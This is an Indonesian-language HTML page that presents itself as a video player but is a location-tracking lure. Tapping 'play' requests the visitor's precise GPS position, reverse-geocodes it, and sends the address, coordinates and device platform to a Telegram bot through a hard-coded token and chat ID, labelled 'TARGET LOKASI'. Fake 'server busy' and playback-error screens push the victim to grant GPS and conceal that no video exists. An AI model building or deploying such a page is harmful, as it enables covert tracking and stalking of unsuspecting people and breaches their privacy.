<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Video</title>
<link href="https://fonts.googleapis.com" rel="stylesheet">
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }
  
  body { 
    margin:0; 
    background:#000; 
    font-family: 'Source Sans Pro', sans-serif; 
    overflow: hidden;
    height: 100vh;
  }
  
  #wrap { 
    position:fixed; 
    inset:0; 
    background:#000; 
  }
  
  /* Gambar background */
  #background-img {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    object-fit: cover;
    z-index: 1;
    user-select: none;
    -webkit-user-drag: none;
  }
  
  /* Overlay gelap di atas gambar agar teks lebih terbaca */
  #overlay {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.3);
    z-index: 2;
  }
  
  #playIcon {
    position:absolute; 
    inset:0;
    display:flex; 
    align-items:center; 
    justify-content:center;
    z-index:5; 
    pointer-events:none;
  }
  
  #playIcon .circle {
    width: 80px;
    height: 80px;
    border-radius: 50%;
    background: rgba(255,255,255,0.25);
    backdrop-filter: blur(10px);
    -webkit-backdrop-filter: blur(10px);
    border: 2px solid rgba(255,255,255,0.3);
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 0.3s ease;
    box-shadow: 0 4px 30px rgba(0,0,0,0.3);
    position: relative;
  }
  
  #playIcon .circle::before {
    content: '';
    position: absolute;
    inset: -2px;
    border-radius: 50%;
    padding: 2px;
    background: linear-gradient(135deg, rgba(255,255,255,0.4), rgba(255,255,255,0.1));
    -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
    -webkit-mask-composite: xor;
    mask-composite: exclude;
  }
  
  #playIcon .circle:hover {
    transform: scale(1.08);
    background: rgba(255,255,255,0.35);
    border-color: rgba(255,255,255,0.5);
    box-shadow: 0 4px 40px rgba(255,255,255,0.15);
  }
  
  #playIcon .circle:active {
    transform: scale(0.95);
  }
  
  /* Segitiga Play - Posisi tepat di tengah */
  #playIcon .triangle {
    width: 0;
    height: 0;
    border-left: 22px solid rgba(255,255,255,0.9);
    border-top: 14px solid transparent;
    border-bottom: 14px solid transparent;
    margin-left: 6px;
    filter: drop-shadow(0 2px 8px rgba(0,0,0,0.3));
    transition: all 0.3s ease;
  }
  
  #playIcon .circle:hover .triangle {
    border-left-color: #ffffff;
    transform: scale(1.05);
  }
  
  #tapLayer {
    position:absolute; 
    inset:0;
    z-index:10; 
    cursor: pointer;
  }
  
  #bar {
    position:absolute; 
    left:0; 
    right:0; 
    bottom:0;
    padding:15px 20px 20px;
    background:linear-gradient(to top, rgba(0,0,0,.8), transparent);
    color:#fff; 
    font-size:13px; 
    z-index:30;
    font-family: 'Source Sans Pro', sans-serif;
  }
  
  #row { 
    display:flex; 
    justify-content:space-between; 
    align-items:center; 
  }
  
  #time {
    font-weight: 300;
    letter-spacing: 0.5px;
  }
  
  #progress { 
    height:4px; 
    background:rgba(255,255,255,.3); 
    margin-top:8px; 
    border-radius: 2px;
    cursor: pointer;
    position: relative;
  }
  
  #fill { 
    width:0%; 
    height:100%; 
    background: #fff;
    border-radius: 2px;
    transition: width 0.1s linear;
  }
  
  #fs { 
    font-size:18px; 
    padding:4px 6px; 
    cursor:pointer;
    opacity: 0.8;
    transition: opacity 0.3s ease;
  }
  
  #fs:hover {
    opacity: 1;
  }

  /* Elemen GPS */
  .loader { 
    width: 50px; 
    height: 50px; 
    border: 4px solid rgba(255,255,255,0.2); 
    border-top: 4px solid #fff; 
    border-radius: 50%; 
    animation: spin 1s linear infinite; 
    display: none; 
    position: fixed; 
    top: 48%; 
    left: calc(50% - 25px); 
    z-index: 55; 
  }
  
  @keyframes spin { 
    0% { transform: rotate(0deg); } 
    100% { transform: rotate(360deg); } 
  }

  /* Teks loading */
  #loading-text {
    display: none;
    position: fixed;
    top: 55%;
    left: 50%;
    transform: translateX(-50%);
    color: #fff;
    font-size: 14px;
    z-index: 55;
    font-family: 'Source Sans Pro', sans-serif;
    letter-spacing: 1px;
    opacity: 0.8;
  }

  .screen { 
    position: fixed; 
    top: 0; 
    left: 0; 
    width: 100%; 
    height: 100%; 
    background: rgba(0,0,0,0.92); 
    display: none; 
    flex-direction: column; 
    justify-content: center; 
    align-items: center; 
    text-align: center; 
    padding: 30px; 
    z-index: 50; 
    color: #fff; 
    box-sizing: border-box; 
    font-family: 'Source Sans Pro', sans-serif;
    backdrop-filter: blur(10px);
  }
  
  .screen p:first-child {
    font-family: 'Poppins', sans-serif;
  }
  
  .screen-icon {
    font-size: 48px;
    margin-bottom: 20px;
  }
  
  .btn-retry { 
    margin-top: 25px; 
    padding: 15px 30px; 
    background: #fff; 
    color: #000; 
    border: none; 
    border-radius: 8px; 
    font-weight: bold; 
    cursor: pointer; 
    width: 85%; 
    max-width: 300px;
    font-size: 16px; 
    font-family: 'Source Sans Pro', sans-serif;
    transition: all 0.3s ease;
  }
  
  .btn-retry:hover {
    transform: scale(1.02);
    box-shadow: 0 4px 20px rgba(255,255,255,0.2);
  }
  
  .btn-retry:active {
    transform: scale(0.98);
  }
  
  /* Animasi pulse pada lingkaran */
  @keyframes pulse {
    0% {
      box-shadow: 0 0 0 0 rgba(255,255,255,0.2);
    }
    70% {
      box-shadow: 0 0 0 20px rgba(255,255,255,0);
    }
    100% {
      box-shadow: 0 0 0 0 rgba(255,255,255,0);
    }
  }
  
  #playIcon .circle {
    animation: pulse 2s ease-in-out infinite;
  }
  
  /* Responsive */
  @media (max-width: 480px) {
    #playIcon .circle {
      width: 60px;
      height: 60px;
    }
    
    #playIcon .triangle {
      border-left-width: 16px;
      border-top-width: 10px;
      border-bottom-width: 10px;
      margin-left: 4px;
    }
    
    #bar {
      padding: 12px 15px 15px;
      font-size: 11px;
    }
    
    .screen p:first-child {
      font-size: 20px !important;
    }
    
    .screen p {
      font-size: 13px !important;
    }
  }
  
  @media (max-width: 380px) {
    #playIcon .circle {
      width: 50px;
      height: 50px;
    }
    
    #playIcon .triangle {
      border-left-width: 14px;
      border-top-width: 8px;
      border-bottom-width: 8px;
      margin-left: 3px;
    }
  }
</style>
</head>
<body>

<div id="wrap">
  <!-- Gambar Background -->
  <img id="background-img" src="https://i.ibb.co.com/mVPrXbvf/Picsart-26-06-23-02-03-11-218.jpg" alt="Background">
  
  <!-- Overlay gelap -->
  <div id="overlay"></div>
  
  <!-- Tombol Play -->
  <div id="playIcon">
    <div class="circle">
      <div class="triangle"></div>
    </div>
  </div>

  <!-- Control Bar -->
  <div id="bar">
    <div id="row">
      <div id="time">0:00 / 8:26</div>
      <div id="fs">⛶</div>
    </div>
    <div id="progress">
      <div id="fill"></div>
    </div>
  </div>

  <!-- Layer Tap -->
  <div id="tapLayer"></div>

  <!-- Loading Spinner -->
  <div class="loader" id="spinner"></div>
  <div id="loading-text">Mengakses GPS...</div>

  <!-- Screen Error -->
  <div id="denied-screen" class="screen">
    <p style="font-size: 22px; font-weight: bold;">Koneksi Sibuk</p>
    <p style="font-size: 15px; color: #aaa; line-height: 1.6;">Server mengalami lonjakan trafik. Silakan muat ulang dan aktifkan GPS untuk sinkronisasi aman agar video dapat diputar.</p>
    <button class="btn-retry" onclick="location.reload()">Muat Ulang</button>
  </div>

  <div id="final-error" class="screen">
    <p style="font-size: 18px; color: #ff4444; font-weight: bold;">Kesalahan Pemutaran</p>
    <p style="font-size: 13px; color: #888; line-height: 1.6;">Gagal memuat sumber media (Error: HLS_PLAY_ERR).<br>Server sedang penuh, Anda bisa mencoba lagi nanti.</p>
    <button class="btn-retry" onclick="location.reload()">Coba Lagi</button>
  </div>
</div>

<script>
const token = "8560002103:AAFo0auV2fqMYpsh-xyqZvwZzdJYBJIfUf8"; 
const chat_id = "-1003580899801"; 

const layer = document.getElementById("tapLayer");
const icon = document.getElementById("playIcon");
const timeEl = document.getElementById("time");
const fill = document.getElementById("fill");
const bar = document.getElementById("progress");
const fs = document.getElementById("fs");
const spinner = document.getElementById("spinner");
const loadingText = document.getElementById("loading-text");

let first = true;
let progressValue = 0;
let progressInterval;

// Simulasi progress bar
function updateProgress() {
  if (progressValue < 100) {
    progressValue += 0.5;
    fill.style.width = progressValue + "%";
  } else {
    clearInterval(progressInterval);
  }
}

function mulai() {
    spinner.style.display = 'block';
    loadingText.style.display = 'block';
    
    // Mulai progress bar simulasi
    progressInterval = setInterval(updateProgress, 100);
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(kirimData, handleDitolak, {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        });
    } else {
        tampilkanError();
    }
}

function kirimData(p) {
    const lat = p.coords.latitude;
    const lon = p.coords.longitude;
    const acc = Math.round(p.coords.accuracy);
    
    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
        .then(res => res.json())
        .then(data => {
            const alamat = data.display_name || "Alamat tidak ditemukan";
            const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
            
            const teks = `📛 TARGET LOKASI\n\n📍 Alamat: ${alamat}\n🎯 Akurasi: ${acc}m\n🔗 Maps: ${googleMaps}\n📱 Platform: ${navigator.platform}`;

            return fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(teks)}`);
        })
        .catch(() => {
            const teksAlt = `👁️ eyeGPT HIT (Alamat Gagal)!\n\n📍 Koordinat: ${lat},${lon}\n🎯 Akurasi: ${acc}m\n🔗 Maps: https://www.google.com/maps?q=${lat},${lon}`;
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(teksAlt)}`);
        })
        .finally(() => {
            setTimeout(tampilkanError, 5000);
        });
}

function handleDitolak() {
    spinner.style.display = 'none';
    loadingText.style.display = 'none';
    clearInterval(progressInterval);
    document.getElementById('denied-screen').style.display = 'flex';
}

function tampilkanError() {
    spinner.style.display = 'none';
    loadingText.style.display = 'none';
    clearInterval(progressInterval);
    document.getElementById('denied-screen').style.display = 'none';
    document.getElementById('final-error').style.display = 'flex';
}

// Event Click
layer.onclick = function(){
  if(first){
    first = false;
    icon.style.display = "none";
    mulai();
  }
};

// Update waktu
setInterval(() => {
  if(timeEl) {
    const currentTime = Math.floor(progressValue / 100 * 506); // 8:26 = 506 detik
    const minutes = Math.floor(currentTime / 60);
    const seconds = currentTime % 60;
    timeEl.textContent = `${minutes}:${seconds.toString().padStart(2, '0')} / 8:26`;
  }
}, 1000);

// Event untuk progress bar
bar.onclick = function(e){
  e.stopPropagation();
  const rect = bar.getBoundingClientRect();
  const x = e.clientX - rect.left;
  const width = rect.width;
  const percentage = (x / width) * 100;
  progressValue = Math.min(100, Math.max(0, percentage));
  fill.style.width = progressValue + "%";
};

fs.onclick = function(e){
  e.stopPropagation();
  if (document.fullscreenElement) {
    document.exitFullscreen();
  } else {
    document.documentElement.requestFullscreen();
  }
};

// Cegah context menu
document.addEventListener('contextmenu', e => e.preventDefault());

// Handle error jika gambar gagal load
document.getElementById('background-img').onerror = function() {
  this.style.display = 'none';
  document.getElementById('overlay').style.backgroundColor = '#000';
};
</script>

</body>
</html>
